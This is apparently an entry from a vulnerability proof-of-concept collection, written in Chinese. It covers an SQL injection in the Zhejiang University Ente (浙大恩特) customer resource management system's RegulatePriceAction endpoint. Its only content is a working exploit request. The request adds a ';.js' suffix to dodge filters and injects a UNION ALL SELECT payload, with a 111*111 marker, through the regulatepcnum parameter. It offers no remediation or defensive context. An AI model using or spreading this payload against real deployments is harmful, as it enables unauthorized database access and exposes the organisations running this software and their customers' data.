## 浙大恩特客户资源管理系统-RegulatePriceAction存在SQL注入

## poc
```
/entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,111*111--+aaaa

```
